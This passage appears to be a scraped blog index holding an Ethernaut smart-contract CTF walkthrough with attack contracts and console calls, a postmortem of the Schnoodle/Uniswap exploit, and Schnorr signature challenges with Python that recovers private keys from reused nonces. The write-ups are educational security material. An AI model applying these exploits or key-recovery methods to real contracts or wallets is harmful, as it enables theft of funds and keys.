of all the ether calling the withdraw() function.Below is the code to execute the transaction calling the contract:await contract.contribute({value:toWei(0.001)})Level 2 [Fallout]This level is an intro to what constructors are in a way.Constructors in solidity are functions which are called on contract intilization before the rest of the code is loaded. In solidity broadly there are two types of bytecodes the creation and runtime bytecode.The constructor logic and its corresponding parameters etc get intialized in the creation bytecode that is generated on deployment of the smartcontract. It includes the input data to the transaction that creates the contract.The creation bytecode intializes all the variables declared inside the constructor and sebsequently genrated the runtime code which includes the rest of the smart contract logic other than the constrctor.This level highlights a classic flaw in the way constructors were allowed to be declared from solidity version ^0.6.0. Constructors were basically named after the contract name itself like so:contract example { function example(){ ... }}now keeping this we will look at the challenge code:// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;contract Fallout { using SafeMath for uint256; mapping (address =&amp;gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &amp;gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; }}Here we can clearly see that the constructor is named improperly the contract name is Fallout while the constructor is named as Fal1out.This will result in being not considered as a fucntion on compilation.rather this fucntion will be considered as anormal function and this means after deployment anybody could call this function which would not have been the case in the case of a constructor.Thus we just need to call this method and as it sets the msg.sender as the owner we will be set as the owner of the function of the contract.Below is the code:await contract.fal1out()Level 3 [Coin Flip]This challenge deals with the concept of randomness in blockchain. In blockchain since everything is deterministic there is no true source of randomness unless we bring some external oracle into the picture to provide a source of randomness.In the challenge as we can see below its basically about guessing the value of a boolean variable correctly 10 times and on guessing wrong even once the the variable tracking the correct guesses is reset to 0.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }}As we can see on line 18 the randomness is generated from the hash of block number.uint256 blockValue = uint256(blockhash(block.number.sub(1)));From line 26 we see that we need the value of the side variable to get a correct guess and side is calculated from blockValue which is derived from subtracting 1 from the current block number.blockValue is further divided by FACTOR of which we know the value of and its result stores in coinFlip.Hence what you migh notice here is that everything in this is already either known to us or can be easilt determined. This means we can just make the flip function ourself to correctly guess the value of side variable and submit it after calling the flip funcion doing these 2 calls 10 times will get us past the level.Level 4 [Telephone]This level illustrates a classic phishing method that can be used to gain access of a smart contract that make use of such authenticating pattern.The contract uses tx.origin check to assign the owner address, the problem is tx.origin is vulnerable to phishing attacks which can trick users into performing authenticated actions on the vulnerable contract.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } }}The goal of this challenge is to pass the check on line 13 and become the owner. If we call the changeOwner() function directly with our player address then the tx.origin which is the address drom which the transaction originated (in this case our player address) and msg.sender (which will also be player address as we called the function) will be same and the check will fail.To bypas this we make use of another contract say attack contract which will call the above contract call this the target contract. As calling another contract also is a message call hence when we call the attack contract the tx.orgin will be set to our address (player address) and this attack contract calls function in target contract making the msg.sender address as the attack contracts address as it is the one calling the changeOwner() function in target contract.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Telephone { function changeOwner(address _owner) external;}contract Attack { Telephone telephone; constructor(address telephoneInstance) { telephone = Telephone(telephoneInstance); } function changeOwner() public { telephone.changeOwner(msg.sender); }}Level 5 [Token]This challenge is based on arithmetic overflow/underflow in solidity.So lets understand what exactly this concept is first.For all the data types present in Solidity the EVM has a specified size fixed for that particular data type. Meaning a certain data type can only represent values in certain range.this concept becomes especiall intresting when it comes to integers as a basic uint8 can represent numbers from $0$ to $2^8-1$ i.e [0,255] this is the range of an 8 bit unsigned integer variable.So integer overflow occurs when an unsigned integer variables value exceeds the range specified for that type and it cant hold that big a value anymore, in which case the value of that variable will be reset to its minimum value i.e 0 and if any excess is there then it will increase from 0 herafter i.e $255 + 1$ will result in $0$ while $255 + 2$ will result in $1$.That was overflow in the case of integer underflow the same occurs just in reverse i.e subtracting 1 from 0 will result in 255 and so on, basically wrapping around but in reverse this time.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token { mapping(address =&amp;gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) public { balances[msg.sender] = totalSupply = _initialSupply; } function transfer(address _to, uint _value) public returns (bool) { require(balances[msg.sender] - _value &amp;gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; }}As we can see we are provided with 20 tokens intially and to win we need to increase the number of tokens to a large value somehow.The transfer function takes in 2 parameters, the amt to transfer and the adress to which to transfer it to. It checks if the sender has that amount to transfer at first then it subtracts that amount from the senders balance and adds it to the recivers balance.The issue here is where it deducts the amount frm the senders balance:balances[msg.sender] -= _value;This line has the ability to underflow reason being there is no checks on the subtraction.Checks for overflow/underflow were not inherantly implemented until solidity version 0.8.0 and above.Until then the developer had to make use of the safeMath library importing it explicitly and using it everytime an addition/subtraction needed to be performed and in this case looking at the solidity version we see that it is below 0.8.0 menaing it is vulnerable to underflow/overflows and since safeMath has not been called it is definetly going to cause underflows and overflows.Taking advantage of this we can send to the transfer function some random address to which we want to transfer tokens and as value for the amount to transfer we can set it to 21.This will result in the subtraction of 20 - 21 when the balance is being deducted from our account and this subsequently will result in an underflow and the value of our balance i.e the senders balance will be reset to the highest value that can be held by a uint variable which will result in a huge amount of tokens in our contract.After this we simply need to submit our instance and we will have passed this level.___Level 6 [Delegation]This level illustrates the useage of delegate call method in solidity and why it should be used with the utmost precaution and how to exploit a delegate call not used properly.Delegate call opcode executes the code in the called contract in the context of the calling contract i.e things like storage and msg.sender and msg.value remain unchanged.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.sender; }}contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) public { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } }}Storage in solidity can be understood as certain slots with each variable being assigned a slot starting from 0.In Delegation contract in slot 0 the variable owner is stored in slot 0 and in Delegate contract too the variable owner is present in slot 0 and in Delegate contract we are modifying this owner variable inside pwn() function, this variable is present in slot 0 of Delegate contract, i.e the variable present in slot 0 of Delegation contract will be modified on calling pwn() function as the call is a delegate call which modifies the corresponding storage slot in the calling contract.Thus if we call via delegate call the pwn() function in Delegate contract with player address our address will be set as the owner of the Delegation contract and thereby we can pass the challenge.To call pwn() function we need to encode the function’s signature in the msg.data field. In solidity encoded function signature of any function is the starting 4 bytes of the $keccak256$ hash of the functions signature. Function signature comprises of the function name along with the data type of parameters seperated by commas and enclosed in paranthesis.The following code can be input into the console to pass the challenge:await sendTransaction({from: player, to: instance, data: &quot;0xdd365b8b&quot;})Refer the next part for further solutions" }, { "title": "Detailed Postmortem of Uniswap v2-Schnoodle Exploit", "url": "/posts/Detailed-Postmortem-of-Uniswap-v2-Schnoodle-exploit/", "categories": "Blockchain", "tags": "Ethereum, Solidity, Postmortem", "date": "2022-08-20 20:30:06 +0800", "snippet": " OverviewExploit TransactionOn Jun-18-2022 (07:05:24 AM +UTC) A ERC-777 smart contract (Schnoodle, symbol SNOOD) was exploited which resulted in the loss of the entire liquidity contained in the UniswapV2Pair token amounting to around 104 ETH. This attack was performed through an attacker contract that executed a series of interactions with the liquidity token and the above mentioned smart contract during its creation.Below is the list of all the adresses which were involved in the exploitAddresses:Attacker: 0x180ea08644b123d8a3f0eccf2a3b45a582075538Attacker contract: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecSchnoodle Proxy: 0xd45740ab9ec920bedbd9bab2e863519e59731941Schnoodle Implementation: 0xeac2a259f3ebb8fd1097aeccaa62e73b6e43d5bfUniswapV2Pair (SNOOD-WETH): 0x0f6b0960d2569f505126341085ed7f0342b67daeThis post aims to explain in detail each transaction that was executed and the vulnerability which reslted in the loss of the tokens.Transactions:First up how does a layman exactly see the series of transactions that ocurred well thats what etherscan is for just serach for the transaction and this is the what how the etherscan output will look like.Above is the list of all the transactions that ocurred which resulted in the exploit.Looking at these we can understand that 6 transactions took place but we do not have any idea on what exactly happened, what functions were called, the order in which they were caled the arguements they tok in or the value returned after their execution.For this we have two tools at our disposal. Which one to use is up to you both have a different way of depicting the transaction details. Using ethx.info Using tenderlyBelow listed are the exact functions which were called to execute the exploit:So we see that 6 functions were called corresponding to the etherscan output shown above. Now lets dive deep into each function listing all its arguements, return values and ofcourse its purpose!#1 balanceOf()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0xd45740ab9ec920bedbd9bab2e863519e59731941Argument(s): 0x0f6b0960d2569f505126341085ed7f0342b67daeDescription: The attacker contract queries the balance present in the UniswapV2 pair contract.Return Value(s): 32308960759206669952686933218 schnood#2 transferFrom()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0xd45740ab9ec920bedbd9bab2e863519e59731941Argument(s): holder: 0x0f6b0960d2569f505126341085ed7f0342b67dae recipient: 0x273521f6582076a5fc54da9af9bfca5435ffe9ec amount: 32308960759206669952686933217Description: This function transfers $balance-1$ schnood from the UniswapV2 pair contract to the attacker contract.Keep note of this strange amount leaving 1 schnood and taking the rest. We will come back to this again.#3 Sync()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0x0f6b0960d2569f505126341085ed7f0342b67daeDescription: The UniswapV2 pair contract does not have any hooks to automatically update the exchange rates for the pool. The sync function does the job of updating the SNOOD-WETH asset pools exchange rate prices.The intresting thing to note here is that at this point in the SNOOD-WETH pool there is only 1 SNOOD token to all the WETH balance present, thus exchange rate for SNOOD to WETH is extremely favorable now.#4 transfer()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0xd45740ab9ec920bedbd9bab2e863519e59731941Argument(s): recipient: 0x0f6b0960d2569f505126341085ed7f0342b67dae amount: 32308960759206669952686933217 Description: This function transfers all the SNOOD tokens whicih were initially trnasferred from the uniswapv2 pair back to the UniswapV2 pair contract. At this point even though the SNOOD tokens have been added to the pool the exchange rate will still remain the same as the pool reserves have not been updated like in the previous case where the malicious contract called the sync() function to update the exchange rate.#5 getReserves()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0x0f6b0960d2569f505126341085ed7f0342b67daeDescription: The output of tis function gives us the reserves of each asset present in the uniswap v2 pair pool in this case as you can see below the reserves have not changed and it still shows that only 1 SNOOD token is present in the pool even though the last transaction transferred all the SNOOD tokens back to the pool contract.Output:#6 swap()From: 0x273521f6582076a5fc54da9af9bfca5435ffe9ecTo: 0x0f6b0960d2569f505126341085ed7f0342b67daeArgument(s): amount0Out: 104047009087796436864 amount1Out: 0 to: 0x180ea08644b123d8a3f0eccf2a3b45a582075538Description The attacker contract now calls the swap() function with the intent of swapping amount0Outh amount of weth. Also notice that the amount0Out is $_reserve0-1$.uint balance0;uint balance1;{ // scope for _token{0,1}, avoids stack too deep errors address _token1 = token1; address _token0 = token0; require(to != _token0 &amp;amp;&amp;amp; to != _token1, &#39;UniswapV2: INVALID_TO&#39;); if (amount0Out &amp;gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens if (amount1Out &amp;gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens...}On line 8 amount0Out is optmistically transferred to the attackers address.now the balance is updated and the new values are:balance0 = IERC20(_token0).balanceOf(address(this));//balance0 = 1 weibalance1 = IERC20(_token1).balanceOf(address(this));//balance1 = 29732115690897246905537466158 SNOODThus the attacker has managed to transfer all but 1 wei from the UniswapV2 pair contract to his wallet address.Now we have a clear idea of how it happened and what all transactions were executed by the attacker to exploit the vulnerability but what exactly was the bug that caused this transfer to occur in the first place. The vulnerability here lies in the second transaction i.e the transferFrom() functionThe VulnerabilityThe issue originates from a function that the transferFrom() function calls.Lets look at the call stack of functions called because of transferFrom(): transferFrom() in ERC777Upgradeable.sol:284calls -&amp;gt; _spendAllowance() in SchnoodleV9Base.sol:57calls -&amp;gt; _getStandardAmount() in SchnoodleV9Base.sol:92calls -&amp;gt; _getReflectRate() in SchnoodleV9Base.sol:97graph TD A[ERC777Upgradeable.sol:284] --&amp;gt;|transferFrom| B(SchnoodleV9Base.sol) B(SchnoodleV9Base.sol:57) --&amp;gt; |_spendAllowance| C(SchnoodleV9Base.sol:92) C(SchnoodleV9Base.sol:92) --&amp;gt; |_getStandardAmount| D(SchnoodleV9Base.sol:97) --&amp;gt; |_getReflectRate| E(Returns reflectedTotalSupply)Following this trace we can see that the issue originates in the function _getStandardAmount() where we can see _getReflectRate() is being called and its value is being used in performing integer divison.function _getStandardAmount(uint256 reflectedAmount) internal view returns(uint256) { // Condition prevents a divide-by-zero error when the total supply is zero return reflectedAmount == 0 ? 0 : reflectedAmount / _getReflectRate();}As we can see reflectedAmount is divided by the return value of _getReflectRate() and notice that this is integer division hence if _getReflectRate() returns a large enough value such that the numerator is smaller then it results in 0 value and this in turn results in zero allowance being spent on any call to transferFrom() effectively allowing anyone calling transferFrom to spend as much money as they want.In the context of this attack specifically reflectedAmount represents the entire amount of balance present in the UniswapV2pair contract minus one i.e 32308960759206669952686933217 this indiactes _getReflectRate() must return a very high value for the division to result in 0.Below we can see the _getReflectRate() function:function _getReflectRate() private view returns(uint256) { uint256 reflectedTotalSupply = super.totalSupply(); return reflectedTotalSupply == 0 ? 0 : reflectedTotalSupply / totalSupply();}As we can see this function divides two variablesERC777Upgradeable._totalSupply and SchnoodleV9Base._totalSupply.The value of the numerator ERC777Upgradeable._totalSupply is just too high compared to the _totalSupply variable in SchnoodleV9Base contract. This results in a large value for the reflectedTotalSupply variable which is in turn returned by _getReflectRate() function which is the denominator part in the division mentioned in the _getStandardAmount() fucntion thereby resulting in the 0 value on integer divison.The root cause of this problem is because of how large these variables have been set at the time of contract intilisation.Lets take a look at how ERC777Upgradeable._totalSupply and SchnoodleV9Base._totalSupply are set at the time of contract intialisation.Both these values are set in the SchnoodleV9Base.initialize() fucntion:function initialize(uint256 initialTokens, address serviceAccount) public initializer { __Ownable_init(); _totalSupply = initialTokens * 10 ** decimals(); __ERC777PresetFixedSupply_init(&quot;Schnoodle&quot;, &quot;SNOOD&quot;, new address[](0), MAX - (MAX % totalSupply()), serviceAccount);}Here we will need to refer the etherscan output on contract initialization to get the value of initialTokens looking at this transaction we can see that the initialize() function is called with initialTokens set to a value of $1000000000000$.Now knowing the value of initialTokens we can calculate the value of both the _totalSupply variables: SchnoodleV9Base._totalSupply = $1000000000000*10^{18}$ = $1000000000000000000000000000000$ ERC777Upgradeable._totalSupply = $(2^{256}-1) - ((2^{256}-1) \\mod 100000000000 * 10^{18})$ = $115792089237316195423570985008687907853269984665000000000000000000000000000000$Thus we can see how large the numerator is compared to the denominator resulting in the large value of the denominator in the the _getStandardAmount() func. and thus leading to the bug.In short the transferFrom() was wrongly implemented resulting in the hack." }, { "title": "SECURITY OF EC-SCHNORR SIGNATURE ALGORITHM", "url": "/posts/SECURITY-OF-EC-SCHNORR-SIGNATURE-ALGORITHM/", "categories": "Crypto", "tags": "Bitcoin protocols, Schnorr, Signaturealgirithm", "date": "2022-01-22 20:30:06 +0800", "snippet": " Recently Elliot ( a.k.a @robot__dreams ) published some crypto/bitcoin related challenges on the EC-schnorr algorithm and key sharing algorithm used to secure bitcoin wallets.This blog post is my detailed explanation of my approach in solving all the challenges.We will start with some basics about the EC-schnorr algortithm and its relevance in blockchain and more specifically in bitcoin.So first up why EC-schnorr?Whats the relevance of this algorithm in bitcoin? well all cryptocurrencies have a basic feature and that is transactions using acccount addresses. To verify that a certain transaction came from the correct account digital signatures are used i.e they validate a transaction. The private key is used to sign a certain message and the other nodes can apply the public key to get back the message from the signature and verify that with the attached message, if it doesnt verify that transaction is rejected and not registered on the ledger.Currently bitcoin uses the ECDSA algorithm for achiving this. But now in the recent Bitcoin Improvement Proposal BIP0340 EC-Schnorr algorithm has been proposed to replace the less efficient ECDSA system since its simpler and more faster.Primer on EC-SchnorrIt is an easy to understand algorithm and simple to implement and verify compared to its counterparts.This like its predecessor, ECDSA operates over the secp256k1 curve paired with sha256 hashes for authentication.Following is the signing /verification method as used in the algorithmSigning\\[m \\qquad\\quad\\quad\\; :Message \\qquad\\qquad\\qquad\\;\\;\\; (byte \\; array)\\]\\[k \\qquad\\qquad\\;\\;\\; :Private \\; Key \\quad\\quad\\quad\\quad\\quad (integer)\\]\\[G \\qquad\\qquad\\;\\; :Generator \\; Point \\quad\\quad\\;\\;\\;\\;\\; (curve point)\\]\\[P = k*G \\quad :Public \\; Key \\quad\\qquad\\quad\\;\\;\\;\\;\\;\\;\\; (curve point)\\]\\[z \\quad\\quad\\qquad\\;\\;\\;\\; :Private \\; nonce \\qquad\\qquad\\; (integer)\\]\\[R = z*G \\quad\\; :Public \\;nonce \\qquad\\qquad\\;\\;\\; (curve point)\\]\\[e = Hash(r||P||m) \\quad :aggregated hash \\quad \\; (integer)\\] $Here \\; r,P,m \\;\\; are \\; all \\; represented \\; in \\; bytes$$And \\; r \\; is \\; the \\; x \\; cordinate \\; of \\; point \\; R$\\[s = z + Hash(r||P||m)*k \\quad :signature \\quad (integer)\\]\\[(r, s) \\qquad\\quad\\;\\;\\;\\; :Signature \\quad\\qquad\\qquad\\;\\; (integer, integer)\\]VerificationPublic Values\\[(r, s) \\qquad\\quad\\;\\;\\;\\; :Signature\\]\\[P \\quad\\qquad\\qquad\\; :Public \\; Key\\]\\[m \\quad\\qquad\\qquad :Message\\]Calculated Values\\[R \\quad\\qquad :Public \\; nonce \\quad (calculated \\; from \\; r)\\]\\[e \\quad\\qquad\\ :Hash(r||P||m)\\]Verifying\\[s = z + Hash(r||P||m)*k\\]\\[s*G = z*G + Hash(r||P||m)*k*G\\]\\[s*G =&amp;gt; R + Hash(r||P||m)*P \\tag{if true then verified}\\]Now that we know the basics of the signing/verification process we can move on the challenges…..Challenges EC-Schnorr Nonce Reuse Linearly Related Nonces Multisignature Forgery Wallet Key ReconstructionEC-Schnorr Nonce ReuseCHALLENGEWe are given the following values. Here the same private key has been used for signing two different messages, the aim is to extract the private keyYou&#39;re given Schnorr signatures on two different messages signed by the same private key. Fortunately for you (the adversary), the signer screwed up theirimplementation of BIP-340 and reused a nonce. Can you capitalize on this fatal error and extract the signer&#39;s private key?Note: You may find it helpful to interpret some of the byte strings as ASCII,in order to check your work.Public Key: 463F9E1F3808CEDF5BB282427ECD1BFE8FC759BC6F65A42C90AA197EFC6F9F26Message 1: 6368616E63656C6C6F72206F6E20746865206272696E6B206F66207365636F6ESignature 1: F3F148DBF94B1BCAEE1896306141F319729DCCA9451617D4B529EB22C2FB521A32A1DB8D2669A00AFE7BE97AF8C355CCF2B49B9938B9E451A5C231A45993D920Message 2: 6974206D69676874206D616B652073656E7365206A75737420746F2067657420Signature 2: F3F148DBF94B1BCAEE1896306141F319729DCCA9451617D4B529EB22C2FB521A974240A9A9403996CA01A06A3BC8F0D7B71D87FB510E897FF3EC5BF347E5C5C1SOLUTIONso here the public key is given along with the two signatures for the two different messagsknown Values:\\[n \\quad\\;\\;\\;\\; :Curve \\; Order\\]\\[G \\quad\\;\\;\\; :Generator \\; for \\; secp256k1 \\; curve\\]\\[P \\quad\\;\\;\\; :Public \\; Key\\]\\[m_1 \\quad :Message \\; 1\\]\\[m_2 \\quad :Message \\; 2\\]\\[(r,s_1) \\quad :S_1 \\; Signature \\; of \\; M_1\\]\\[(r,s_2) \\quad :S_2 \\; Signature \\; of \\; M_2\\] $\\; r \\; is \\; the \\; x \\; cordinate \\; of \\; Public \\; Nonce \\; R$Calculated Values:\\[R \\quad\\; :Public \\; nonce \\quad (calculated \\; from \\; r)\\]\\[e_1 \\quad :Hash(r||P||m_1)\\]\\[e_2 \\quad :Hash(r||P||m_2)\\]Now that we have all the values we can write the equations for both $s_1$ and $s_2$\\[s_1 = z + Hash(r||P||m_1)*k \\tag{1}\\]\\[s_2 = z + Hash(r||P||m_2)*k \\tag{2}\\]Our aim is to get \\(k\\)since the $z$ ( private nonce ) is same in both (1) and (2) we can do \\(s_1 - s_2 \\tag{3}\\)so we will get:\\[z + Hash(r||P||m_1)*k - (z + Hash(r||P||m_2)*k)\\]\\[z + Hash(r||P||m_1)*k - z - Hash(r||P||m_2)*k\\]\\[Hash(r||P||m_1)*k - Hash(r||P||m_2)*k\\]\\[e_1*k - e_2*k\\]\\((e_1-e_2)*k = s_1 - s_2 \\tag{from 3}\\)\\[k = \\frac{s_1 - s_2}{e_1-e_2}\\]Since all these operations are done in a finite field final equation will be\\[k \\equiv (s_1 - s_2)*(e_1-e_2)^{-1} \\bmod n \\tag{4}\\]All the values in the RHS of (4) are known to us thus we can easily get the Private Key $k$IMPLEMENTATIONfrom Crypto.Util.number import long_to_bytes, bytes_to_long, inverseimport hashlibn = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141p = &quot;463F9E1F3808CEDF5BB282427ECD1BFE8FC759BC6F65A42C90AA197EFC6F9F26&quot;m1 = &quot;6368616E63656C6C6F72206F6E20746865206272696E6B206F66207365636F6E&quot;m2 = &quot;6974206D69676874206D616B652073656E7365206A75737420746F2067657420&quot;s1 = &quot;F3F148DBF94B1BCAEE1896306141F319729DCCA9451617D4B529EB22C2FB521A32A1DB8D2669A00AFE7BE97AF8C355CCF2B49B9938B9E451A5C231A45993D920&quot;s2 = &quot;F3F148DBF94B1BCAEE1896306141F319729DCCA9451617D4B529EB22C2FB521A974240A9A9403996CA01A06A3BC8F0D7B71D87FB510E897FF3EC5BF347E5C5C1&quot;p = bytes.fromhex(p)s1 = bytes.fromhex(s1)s2 = bytes.fromhex(s2)r1,s1 = s1[0:32],s1[32:]r2,s2 = s2[0:32],s2[32:]r =r1m1 = bytes.fromhex(m1)m2 = bytes.fromhex(m2)s1 = bytes_to_long(s1)s2 = bytes_to_long(s2)def int_from_bytes(b: bytes) -&amp;gt; int: return int.from_bytes(b, byteorder=&quot;big&quot;)def tagged_hash(tag: str, msg: bytes) -&amp;gt; bytes: tag_hash = hashlib.sha256(tag.encode()).digest() return hashlib.sha256(tag_hash + tag_hash + msg).digest()e1 = int_from_bytes(tagged_hash(&quot;BIP0340/challenge&quot;, r + p + m1)) % ne2 = int_from_bytes(tagged_hash(&quot;BIP0340/challenge&quot;, r + p + m2)) % nsecret_key = ((s2-s1)*(inverse(e2-e1,n)))%nprint(long_to_bytes(secret_key))secret_key = hashlib.sha256(long_to_bytes(secret_key)).hexdigest() Here s1 and s2 represent the combined 64 byte signature $(r,s)$ of which 32 bytes are of $r$ and 32 bytes of $s$The secret key comes out to be b&#39;congratulations you found the sk&#39;.MITIGATIONSo now that we have exploited the vulnerability how do we mitigate it well in this case its as simple as just using a different random private nonce commitment each time you sign a meassage.Linearly Related NoncesCHALLENGEThe poor signer realized their mistake and upgraded their implementation to randomly generate (private) nonces. Unfortunately, they also didn’t get the memo to use a secure PRNG, and ended up using a Linear Congruential Generator instead.You’re given Schnorr signatures on two different messages signed by the same private key. Although the signatures both verify under BIP-340, the two private nonces are related via $z2 = a * z1 + b$ , where $a = 31337$ and $b = 69420$.Can you still extract the signer’s private key?Public Key21922E7D5988A711123794D70B19C2827B1630BC2AB99887418D9EF4AFDB1AC2Message 149276D20626574746572207769746820636F6465207468616E20776974682077Signature 119D6493FBA397CDD1C1E10F9AB51E65531D587D7C53C04673779E1A307AC795CF801B1BF3D103771F74C5F70BB3A3557D87E5116294A9ABD357DC4367D123C9DMessage 24265696E67206F70656E20736F75726365206D65616E7320616E796F6E652063Signature 20293422DCE97000231B98AFE3CBE405601D4129296AB902822514DF9B2F0BC9D7FC2B9C64FA080688D020407900CE9DE887B9CBB25C34280DAB6E172CC39C2F0SOLUTIONHere instead of reused nonce we are given a relation between the two nonces represented by $z_2 = 31337 * z_1 + 69420$$z_1$ and $z_2$ are the private nonce value for the two 64 byte signatures $S_1$ and $S_2$Since we already have an equaiton with the two nonces the obvious next step would be to get another equation in $z_1$ and $z_2$ and solving for both.To do that lets look at the provided data:known Values:\\[n \\quad\\;\\;\\;\\; :Curve \\; Order\\]\\[G \\quad\\;\\;\\; :Generator \\; for \\; secp256k1 \\; curve\\]\\[P \\quad\\;\\;\\; :Public \\; Key\\]\\[m_1 \\quad :Message \\; 1\\]\\[m_2 \\quad :Message \\; 2\\]\\[(r_1,s_1) \\quad :S_1 \\; Signature \\; of \\; M_1\\]\\[(r_2,s_2) \\quad :S_2 \\; Signature \\; of \\; M_2\\] $\\; r_1 \\; and \\; r_2 \\; are \\; the \\; x \\; cordinates \\; of \\; their \\; corresponding \\; Public \\; Nonce \\; values$Calculated Values:\\[e_1 \\quad :Hash(r_1||P||m_1)\\]\\[e_2 \\quad :Hash(r_2||P||m_2)\\]Now that we have all the values we can write the equations for both $s_1$ and $s_2$\\[s_1 = z_1 + Hash(r_1||P||m_1)*k \\tag{1}\\]\\[s_2 = z_2 + Hash(r_2||P||m_2)*k \\tag{2}\\]Our aim is to get an equation in $z_1$ and $z_2$ for that we wil need to eliminate $k$ from $(1)$ and $(2)$\\(Taking \\;\\; (1) :\\)\\[s_1 - z_1 = Hash(r_1||P||m_1)*k\\]\\[s_1 - z_1 = e_1*k\\]\\(k \\equiv (s_1 - z_1)*e_1^{-1} \\bmod n \\tag{3}\\) \\(Taking \\;\\; (2) :\\)\\[s_2 - z_2 = Hash(r_2||P||m_2)*k\\]\\[s_2 - z_2 = e_2*k\\]\\(k \\equiv (s_2 - z_2)*e_2^{-1} \\bmod n \\tag{4}\\) \\(From \\;\\; (3) \\;\\; and \\;\\; (4)\\)\\[(s_1 - z_1)*e_1^{-1} \\equiv (s_2 - z_2)*e_2^{-1} \\bmod n\\]\\[s_1*e_1^{-1} - z_1*e_1^{-1} \\equiv s_2*e_2^{-1} - z_2*e_2^{-1} \\bmod n\\]\\[z_2*e_2^{-1} - z_1*e_1^{-1} \\equiv s_2*e_2^{-1} - s_1*e_1^{-1}\\bmod n\\]let \\(s_2*e_2^{-1}-s_1*e_1^{-1}\\) be $c$ so we get:\\(z_2*e_2^{-1} - z_1*e_1^{-1} \\equiv c\\bmod\\ n \\tag{5}\\)\\(z_2 - a * z_1 = b \\tag{6}\\)from $(5)$ and $(6)$ we can get the values of both nonces and then using either $(3)$ or $(4)$ we can get the private key $k$.MITIGATION Again the answer here is simple read the definiton of nonce :). The word nonce itself is a combination of two words Only Once. Use a particular nonce only once in the whole algorithm implementation. If you still dint understand here the definition from wikipedia nonce (number once) is an arbitrary number that can be used just once in a cryptographic communication. Lastly, use a secure CSPRNG and dont go diving into implementing your own techniques for nonce generation. Multisignature ForgeryThis challenge was a bit on the harder side compared to the other two in the sense it required a bit more in dept knowledge of Elliptic Curves and EC-Schnorr signatures.So before we actually dive into the challenge lets do a quick brief on multisignatures in EC-Schnorr.EC-Schnorr Multisignatures Multisignature is used when a certain transaction is to be signed by more than one node. I.e before that transaction is broadcasted onto to the blockchain it is signed by multiple users. In EC-Schnorr this multisig feature is achived via a property it has, namely Linearity. Schnorr signatures are Linear. Simply meaning on adding two schnorr signatures the resultant is also a valid schnorr signature. This property is very important as it enables multiple parties to share a common signature instead of generating multiple signaters over a message and sending it over a transaction. The public keys of all signers are added and so are the public nonces R, and are translated into the public key and nonce commitment value for the aggregated multisig. Following are the steps to generate a two party multisignature: All the terms used are as explained in this sectionADDITIONAL TERMS:\\[P_{agg} \\quad :Aggregate \\;of \\;public \\;keys \\;(P_1+P_2)\\]\\[z_{agg} \\quad :Aggregate \\;of \\;private \\;nonces \\;(z_1+z_2)\\]\\[r_{agg} \\quad :x \\;cordinate \\;of z_{agg}*G\\]MULTI SIG CREATION:Individual sig\\[s_1 = z_1 + Hash(r_{agg}||P_{agg}||m)*k_1 \\quad :sig \\;of \\;person 1\\]\\[s_1 = z_2 + Hash(r_{agg}||P_{agg}||m)*k_2 \\quad :sig \\;of \\;person 2\\]Aggregated sig\\[s = s_1+s_2\\]\\[s = (z_1+z_2) + Hash(r_{agg}||P_{agg}||m)*(k_1+k_2)\\]\\[s = z_{agg} + Hash(r_{agg}||P_{agg}||m)*k \\tag{aggregated signature}\\]MULTI SIG VERIFICATION:\\[s*G = (z_1 + z_2)*G + Hash(r_{agg}||P_{agg}||m)*(k_1 + k_2)*G\\]\\[s*G = z_{agg}*G + Hash(r_{agg}||P_{agg}||m)*(P_1 + P_2)\\]\\[s*G = z_{agg}*G + Hash(r||P_{agg}||m)*P_{agg} \\tag{if true then verified}\\]Now lets move on to the actul challenge…CHALLENGEThis challenge is a server based nc challenge but for ease of solving the goal is just to write a function which will generate a forged function and pass the schnorr verification fucntion.You can download the files from hereThis is the function we have to implement:def forge_signature(honest_signer, msg): &quot;&quot;&quot; TODO: Your implementation here! Your goal is to return a tuple with two elements: - A list of public keys, at least one of which is the honest signer&#39;s public key - A valid BIP-340 signature for the input msg, when verified against the aggregate public key which is the 